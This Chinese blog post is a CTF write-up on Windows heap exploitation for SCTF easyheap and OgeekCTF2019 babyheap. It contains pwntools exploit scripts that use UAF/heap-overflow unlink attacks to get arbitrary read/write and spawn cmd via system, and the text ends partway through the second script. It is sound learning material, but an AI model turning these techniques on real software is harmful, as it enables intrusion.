<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>初探 Windows 用户态堆利用——SCTF-easyheap 和 OgeekCTF2019 babyheap wp - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="最近这段时间学习了一下 Windows heap 利用，大致感触为 Windows 的 heap 利用比起 Linux 要繁琐许多，因为 Windows 中并没有类似于 __free_hook 这些可以劫持执行流的指针，类似于 Linux got 表的 IAT 表也是"><meta property="og:image" content><meta property="og:title" content="初探 Windows 用户态堆利用——SCTF-easyheap 和 OgeekCTF2019 babyheap wp"><meta property="og:description" content="最近这段时间学习了一下 Windows heap 利用，大致感触为 Windows 的 heap 利用比起 Linux 要繁琐许多，因为 Windows 中并没有类似于 __free_hook 这些可以劫持执行流的指针，类似于 Linux got 表的 IAT 表也是"><meta property="og:type" content="article"><meta property="og:url" content="https://cjovi.icu/wp/1624.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-04-01T19:44:00+00:00"><meta property="article:modified_time" content="2022-04-01T19:44:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="初探 Windows 用户态堆利用——SCTF-easyheap 和 OgeekCTF2019 babyheap wp"><meta name=twitter:description content="最近这段时间学习了一下 Windows heap 利用，大致感触为 Windows 的 heap 利用比起 Linux 要繁琐许多，因为 Windows 中并没有类似于 __free_hook 这些可以劫持执行流的指针，类似于 Linux got 表的 IAT 表也是"><script src=https://cjovi.icu/js/feather.min.js></script>
<link href=https://cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://cjovi.icu/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>初探 Windows 用户态堆利用——SCTF-easyheap 和 OgeekCTF2019 babyheap wp</h1><div class=meta>Posted on Apr 1, 2022</div></div><section class=body><p>最近这段时间学习了一下 Windows heap 利用，大致感触为</p><ul><li>Windows 的 heap 利用比起 Linux 要繁琐许多，因为 Windows 中并没有类似于 <code>__free_hook</code> 这些可以劫持执行流的指针，类似于 Linux got 表的 IAT 表也是只读的，所以要最终实现利用往往需要通过一系列冗长的 leak 找到栈地址然后 rop。</li><li>Windows 闭源，虽然微软提供了 pdb 文件，但是想要通过逆向搞懂整个流程还是很有逆向难度的，现在我只能跟着大佬们的总结学习流程，仿佛又回到了之前学 Linux heap exploit 之初看不懂源码意识流 pwn 的时候。</li></ul><p>总共做了两道题，SCTF-easyheap 和 OgeekCTF2019 babyheap，两题都是 unlink 实现任意地址读写，不过前一题提供了函数指针可以直接劫持执行流，后者则需要 rop。</p><p>参考资料：</p><ul><li><a href=https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/>SCTF 2020 EasyWinHeap 入门 Windows Pwn</a></li><li><a href=https://www.jianshu.com/p/a853040d2804>Windows系统下典型堆漏洞产生原理及利用方法研究</a></li><li><a href=https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-version>Windows 10 Nt Heap Exploitation (chinese version)</a></li><li><a href=https://xz.aliyun.com/t/6319>ogeek ctf 2019 win pwn babyheap 详解</a></li></ul><h2 id=环境配置>环境配置</h2><p><em>我整理了一下用到的没用到的工具，放到了<a href=https://github.com/chujDK/windows-pwning-tools>我的 GitHub 仓库</a>上</em></p><p>调试工具：</p><ul><li>在客户机内使用 windbg 调试<ul><li>到<a href=https://developer.microsoft.com/zh-cn/windows/downloads/sdk-archive/>微软官网</a>下载符合自己 Windows 版本的 sdk 并安装即可。</li><li>可以通过 windbg 便捷地下到各个 dll 的 pdb 文件，在 windbg 中的 [file] -> [Symbol File Path] 中添加 <code>C:\symbols;SRV*C:\symbols*http://msdl.microsoft.com/download/symbols</code>（可能需要代理）</li></ul></li><li>远程调试：使用 ida</li></ul><p>调试、利用环境</p><p>参考<a href=https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/>大师傅的文章</a>使用 socat + pwntools + ida 进行调试利用。</p><ul><li><p>首先 socat 起服务</p><ul><li><code>socat tcp-listen:8888,fork EXEC:target.exe,pipes</code></li><li>根据版本不同，可能需要手动到防火墙里面把 socat 加到白名单中</li></ul></li><li><p>然后脚本头部加上 <code>raw_input()</code>，起脚本，连接后会停住</p></li><li><p>这个时候用 ida 的远程调试 attach 到对应进程上，F9 继续执行，到脚本出敲下回车，脚本继续执行，执行到 ida 设置的断点处就会断下了</p></li></ul><p>这种做法确实相对麻烦一些，并且由于我已经习惯了 gdb 的命令行式调试，所以其实初用 ida 调试是很不习惯的，不过这样可以避免每次开一台新的 win 虚拟机都重配一遍 python，使用原先 Linux pwn 的 pwntools 环境即可。</p><p>关于动态链接库，毕竟我们只是学习一下，不需要和原题的 dll 环境完全一致，保证大版本相同即可，而且实际上差别可能也只在偏移上，所以我就不去折腾换 Windows 的 dll 了（我估摸着也不太可能能像 Linux 那样随意换吧）。</p><p>另外，关于 Windows 的进程运行原理，建议参考《程序员的自我修养》Windows 相关章节，考虑到之前看这本书的时候偷了懒，其实我这方面的知识很散装，这里就不献丑了hhh。</p><h2 id=sctf-easyheap>SCTF-easyheap</h2><p><em>利用环境为 <code>win7 sp1</code></em></p><p>这道题目比较简单，漏洞点是一个 UAF + 一个堆溢出，当然，由于 UAF 品相非常好，所以堆溢出也没用上，类别 Linux ptmalloc2 的利用，利用其实就是一个 UAF leak + 一个 unlink。不过对于我这种对 Windows 一无所知的人来说，借着这道题，学习一些 Windows 的一些知识，也算挺有收获的。</p><h3 id=利用>利用</h3><p>首先先分析程序，提供了五个方法</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/04/1385236027.png alt=menu></p><p>其中 delete 方法没有把 free 掉的指针置零</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/04/1944542078.png alt="without set-null"></p><p>对于每个 Note 的结构，分析可得如下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>note</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#902000>void</span><span style=color:#666>*</span> puts_ptr;
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> <span style=color:#666>*</span>content;
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>其中 puts_ptr 是一个函数指针，低四位被复用当作了 edit 时的大小。</p><p>别的部分逻辑都很好理解，这里不在赘述，只有 add 方法一个奇怪的 while 循环有点复杂，大概是编译器的什么优化吧。既然有 UAF，在 ptmalloc2 下我们很容易想到直接改 fastbin/tcache 的 next 直接任意地址分配，在 Windows 下虽然也有类似的单链表结构，在 Windows7 中也就是 LFH（<strong>L</strong>ow <strong>F</strong>ragment <strong>H</strong>eap，低碎片堆） 了，不过这个东西开启有一定的条件，而且（至少在 win10 中）是随机分配的，不太稳定，这里还是利用后端堆管理器的 FreeHints（类似于 ptmalloc 中的 small bins）的 unlink 操作来实现利用。</p><p>这里的 unlink 操作和 ptmalloc 中并无特别大的区别，毕竟一个双链表脱链的操作还能有多大差别，参考前文提到的第二篇文章，可知该操作伪代码大致为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>next <span style=color:#666>=</span> vent<span style=color:#666>-&gt;</span>Flink;
</span></span><span style=display:flex><span>prev <span style=color:#666>=</span> vent<span style=color:#666>-&gt;</span>Blink;
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (prev<span style=color:#666>-&gt;</span>Flink <span style=color:#666>!=</span> next<span style=color:#666>-&gt;</span>Blink <span style=color:#666>||</span> prev<span style=color:#666>-&gt;</span>Flink <span style=color:#666>!=</span> vent)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  RtlpHeapReportCorruption(vent);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  prev<span style=color:#666>-&gt;</span>Flink <span style=color:#666>=</span> next;
</span></span><span style=display:flex><span>  next<span style=color:#666>-&gt;</span>Blink <span style=color:#666>=</span> prev;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>我们参考 <a href=https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/#_2>ctf-wiki 对 unlink 的介绍</a>即可。为了完成这一点，只要先把 heap 地址 leak 出来，这通过 free 后 show 即可，然后一次 unlink 即可完全控制 note 数组，另外 note 结构里面居然存了一个函数指针，再通过 show 即可 leak 出函数指针获得 image base。然后修改 content 指针读取 idata 段的 crt 函数地址，leak 出来即可算出 system 函数的地址，最后直接劫持 puts 函数指针为 system 即可 getshell。所以有 exp</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#34;debug&#34;</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>os <span style=color:#666>=</span> <span style=color:#4070a0>&#34;windows&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;192.168.XXX.XXX&#34;</span>, XXXX)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add</span>(size):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;option &gt;&#34;</span>, <span style=color:#4070a0>&#34;1</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;size &gt;&#34;</span>, <span style=color:#007020>str</span>(size) <span style=color:#666>+</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(idx):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;option &gt;&#34;</span>, <span style=color:#4070a0>&#34;2</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;index &gt;&#34;</span>, <span style=color:#007020>str</span>(idx) <span style=color:#666>+</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>show</span>(idx):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;option &gt;&#34;</span>, <span style=color:#4070a0>&#34;3</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;index &gt;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#007020>str</span>(idx) <span style=color:#666>+</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>edit</span>(idx, payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;option &gt;&#34;</span>, <span style=color:#4070a0>&#34;4</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;index &gt;&#34;</span>, <span style=color:#007020>str</span>(idx) <span style=color:#666>+</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;content  &gt;&#34;</span>, <span style=color:#007020>str</span>(payload))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>raw_input()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># first, leak the heap base</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>32</span>) <span style=color:#60a0b0;font-style:italic># 0</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>32</span>) <span style=color:#60a0b0;font-style:italic># 1</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>32</span>) <span style=color:#60a0b0;font-style:italic># 2</span>
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>show(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>heap_base <span style=color:#666>=</span> u32(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)[:<span style=color:#40a070>4</span>]<span style=color:#666>.</span>ljust(<span style=color:#40a070>4</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0x630</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;heap_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(heap_base))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># we want to unlink, so we first get the note array&#39;s address</span>
</span></span><span style=display:flex><span>note_array_addr <span style=color:#666>=</span> heap_base <span style=color:#666>+</span> <span style=color:#40a070>0x578</span>
</span></span><span style=display:flex><span>note_0 <span style=color:#666>=</span> note_array_addr
</span></span><span style=display:flex><span>note_1 <span style=color:#666>=</span> note_array_addr <span style=color:#666>+</span> <span style=color:#40a070>8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>1</span>, p32(note_1) <span style=color:#666>+</span> p32(note_1 <span style=color:#666>+</span> <span style=color:#40a070>4</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>add(<span style=color:#40a070>32</span>) <span style=color:#60a0b0;font-style:italic># trigger unlink</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># currently, note[1].content == &amp;note[1].content</span>
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>1</span>, p32(note_1 <span style=color:#666>+</span> <span style=color:#40a070>8</span>)[:<span style=color:#40a070>3</span>] <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># currently, note[1].content == &amp;note[1].content + 4</span>
</span></span><span style=display:flex><span>show(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>image_base <span style=color:#666>=</span> u32(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>4</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0x1043</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;image_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(image_base))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exit_idata_addr <span style=color:#666>=</span> image_base <span style=color:#666>+</span> <span style=color:#40a070>0x20B0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>1</span>, p32(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p32(note_0) <span style=color:#666>+</span> p32(image_base <span style=color:#666>+</span> <span style=color:#40a070>0x1043</span>) <span style=color:#666>+</span> p32(exit_idata_addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># here 0 - 1 = 0xFFFFFFFF</span>
</span></span><span style=display:flex><span>show(<span style=color:#40a070>3</span>) <span style=color:#60a0b0;font-style:italic># leak the exit&#39;s addr</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># setvbuf 100464D0 system 100EFDA0</span>
</span></span><span style=display:flex><span>exit_addr <span style=color:#666>=</span> u32(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>4</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>4</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;exit_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(exit_addr))
</span></span><span style=display:flex><span>system_addr <span style=color:#666>=</span> exit_addr <span style=color:#666>-</span> <span style=color:#40a070>0x100464D0</span> <span style=color:#666>+</span> <span style=color:#40a070>0x100EFDA0</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;system_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(system_addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>2</span>, p32(system_addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>0</span>, <span style=color:#4070a0>&#34;cmd</span><span style=color:#4070a0;font-weight:700>\x00\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>show(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><p>这个 exp 有小概率打不通，因为在 edit 功能会在末尾附加 <code>\x00</code>，需要保证 heap 地址小于 0x01000000。当然也可以保证 heap 大于 0x01000000 然后在 leak image addr 前不修改 content 指针，直接 show，由于 content 指针不会截断，可以直接 leak 出来 puts_ptr。不过我测试了一些堆地址大概率是小于 0x01000000 的，所以还是选择多 edit 一次。</p><h2 id=ogeekctf2019-babyheap>OgeekCTF2019 babyheap</h2><p><a href=https://github.com/bash-c/pwn_repo/tree/master/oGeekCTF2019_babyheap_src>attachment</a></p><p><img src=https://www.cjovi.icu/usr/uploads/2022/04/1344882685.png alt="windows version"></p><p>所以我特意装了个 Windows server 2019，Windows 10 nt heap 结构建议参考 angle boy 的 slide：<a href=https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-version>Windows 10 Nt Heap Exploitation (chinese version)</a>。</p><p>程序的流程也不难逆，漏洞也很明显，就是 polish（edit 功能）中有堆溢出</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/04/961891174.png alt=polish></p><p>同时 add 时也有 <code>off-by-one</code>，但是没用上。另外输入都没有在末尾附加 <code>'\x00'</code>。</p><p>另外开头送给了我们 image 的地址，同时还有一个我没用上的后面。</p><h3 id=利用-1>利用</h3><p>和上题类似，我们使用 unlink，不过这里要实现 UAF 得通过堆溢出实现，所以得先把 <code>_HEAP->Encoding</code> leak 出来，打开 WinDbg-x86，open executable 调试 babyheap，使用 <code>dt _HEAP</code> 查看该字段位置</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/04/4070109866.png alt=_HEAP></p><p>可以看到在 0x50 偏移处，当然我们没法直接把这个读出来，不过由于 xor 运算可逆，所以我们只要把某个 UserBlock 的 header leak 出来，xor 他的真实值即可算出该 encoding。使用这样的脚本 leak</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;A&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 0</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;B&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 1</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;C&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 2</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;D&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 3</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;D&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 4</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;D&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 5</span>
</span></span><span style=display:flex><span>show(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;B&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span>)
</span></span><span style=display:flex><span>xored_header <span style=color:#666>=</span> u64((sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#34;</span>))[:<span style=color:#40a070>7</span>] 
</span></span><span style=display:flex><span>                    <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x08</span><span style=color:#4070a0>&#39;</span>)
</span></span></code></pre></div><p>通过调试，首先找到 _HEAP 结构体（这个结构体一般在 heap 段的头部，如果找不到可以先通过一个 freed block 的 flink 指针找到 FreeLists 字段的地址，32 位时该字段相对于 _HEAP 头的偏移为 0xC0，然后就可以获得 Encoding 了）的位置，然后找到 Encoding，然后可以算出对于 idx=1 的 UserBlock 的 header 其真实值为 <code>0x0800000809010008</code></p><h4 id=任意地址读写>任意地址读写</h4><p>那么之后的利用，一个自然的想法是 UAF 一个 freed Block，修改 Flink 和 Blink 指向进程 image 中的 content_array，然后 unlink 一打即可获得非法指针，但是由于此题存在一个 exist 数组判断每个 note 有没有被 free 过，所以这样不可行。另外，如果真的这么做，会发现用 win7 中 HeapAlloc 触发 unlink 的方法会 abort 掉，这是因为 win10 中加入了 ListHint 来加速对 FreeLists 的查找，HeapAlloc 时返回的 Block 被 ListHint 直接指向，这个时候会做检测，如果我们修改了 Block 的 Flink，Blink，就会被检出而 abort。</p><p>不过我们仍然可以修改某个 Block 的 header，伪造一个 freed Block，然后通过 Block 的合并实现 unlink。</p><p>引用 angel boy 的 slide</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/04/4103685701.png alt=header></p><p>我打的版本的 Windows 的 size 字段和 angel boy 的 slide 描述的不同，不是 <code>real_size >> 4</code> 而是 <code>real_size >> 3</code>，所以对于 0x40 大小的 freed Block，size = 0x0008，flag = 0x00，SmallTagIndex = 0，后面的 4 个 byte 不变，由此可以写出 payload</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> p64(xor(cookie, <span style=color:#40a070>0x0800000808000008</span>))
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p32(note_array_addr <span style=color:#666>+</span> <span style=color:#40a070>0x4</span>) <span style=color:#666>+</span> p32(note_array_addr <span style=color:#666>+</span> <span style=color:#40a070>0x8</span>)
</span></span></code></pre></div><p>这样在 free 伪造的 freed Block 的前一个 Block 时触发后向合并就会 unlink 了，为了不 abort，我们要保证该 Block 不被 ListHint 直接指向，当然他都没被 free 过肯定不会被直接指向，然后我们就获得了任意地址读写的能力</p><p>到此为止的脚本</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#666>...</span>
</span></span><span style=display:flex><span>raw_input()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;village gift : &#34;</span>)
</span></span><span style=display:flex><span>image_base <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>), base <span style=color:#666>=</span> <span style=color:#40a070>16</span>) <span style=color:#666>-</span> <span style=color:#40a070>0x1090</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;image_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(image_base))
</span></span><span style=display:flex><span>note_array_addr <span style=color:#666>=</span> image_base <span style=color:#666>+</span> <span style=color:#40a070>0x4370</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;A&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 0</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#34;B&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x38</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 1</span>
